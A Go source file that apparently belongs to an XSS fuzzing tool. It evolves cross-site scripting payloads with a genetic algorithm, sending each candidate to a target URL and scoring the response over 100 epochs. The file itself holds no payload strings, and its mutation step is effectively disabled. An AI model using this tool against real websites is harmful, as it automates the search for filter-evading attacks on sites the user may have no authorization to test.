package geneticAlgorithm

import (
	"github.com/Timofey21/darlene/pkg/print"
	"github.com/Timofey21/darlene/pkg/read"
	"github.com/Timofey21/darlene/pkg/request"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"time"
)

const randomCirclesCrossOver = 30
const randomCirclesMutation = 5
const epoch = 100

func LowerHighStr(str string) string {
	var idx int

	for i := 0; i < len(str); i++ {

		rand.Seed(time.Now().UnixNano())
		idx = rand.Intn(len(str))

		str = str[:idx] + strings.ToLower(string(str[idx])) + str[idx + 1:]

		rand.Seed(time.Now().UnixNano())
		idx = rand.Intn(len(str))

		str = str[:idx] + strings.ToUpper(string(str[idx])) + str[idx + 1:]
	}

	return str

}
func crossover(xssAttacks []read.XssAttack) []read.XssAttack {

	max:= len(xssAttacks)
	for i := 0; i < randomCirclesCrossOver; i++ {
		rand.Seed(time.Now().UnixNano())
		a1 := rand.Intn(max)

		rand.Seed(time.Now().UnixNano())
		a2 := rand.Intn(max)

		rand.Seed(time.Now().UnixNano())
		module := rand.Intn(6)

		buff := xssAttacks[a1].Attack[module]
		xssAttacks[a1].Attack[module] = xssAttacks[a2].Attack[module]
		xssAttacks[a2].Attack[module] = buff
	}

	return xssAttacks
}

func mutation(xssAttacks []read.XssAttack) []read.XssAttack {

	max:= len(xssAttacks)
	min:= max / 2
	for i := 0; i < randomCirclesMutation; i++ {
		rand.Seed(time.Now().UnixNano())

		idx := rand.Intn(max - min) + min
		module := rand.Intn(6)

		//xssAttacks[idx].Attack[module] = LowerHighStr(xssAttacks[idx].Attack[module])
		xssAttacks[idx].Attack[module] = xssAttacks[idx].Attack[module]
	}

	return xssAttacks
}

func sum(xssAttacks []read.XssAttack) (result float64) {
	result = 0
	for _, v := range xssAttacks {
		result += v.FitFunction
	}
	return
}



func GA(attackUrl string, xssAttacks []read.XssAttack) {

	for i := 0; i < epoch; i++ {

		for j := 0; j < len(xssAttacks); j++ {

			xss := xssAttacks[j].Attack[0] + xssAttacks[j].Attack[1] + xssAttacks[j].Attack[2] +
				xssAttacks[j].Attack[3] + xssAttacks[j].Attack[4] + xssAttacks[j].Attack[5]

			xssVector := attackUrl + url.QueryEscape(xss)

			resp, err := request.Request(xssVector)
			if err != nil {
				log.Println(err)
			}

			if resp.StatusCode == http.StatusOK {
				bodyBytes, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					log.Fatal(err)
				}
				bodyString := string(bodyBytes)

				var buff float64 = 0


				buff = fitFunction(attackUrl, bodyString, xss)

				xssAttacks[j].FitFunction = buff

			}

			err = resp.Body.Close()
			if err != nil {
				log.Println(err)
			}
		}

		sort.SliceStable(xssAttacks, func(i, j int) bool {
			return xssAttacks[i].FitFunction > xssAttacks[j].FitFunction
		})

		newPopulation := xssAttacks // selection

		newPopulation = crossover(newPopulation)
		newPopulation = mutation(newPopulation)

		xssAttacks = newPopulation

		//avgFitFunction := sum(xssAttacks) / float64(len(xssAttacks))
		//print.FitFunc = append(print.FitFunc, avgFitFunction)
		//
		//fmt.Println("Epoch: ", i, "FitFunction: ", avgFitFunction)

	}

	print.PrintResult()

}
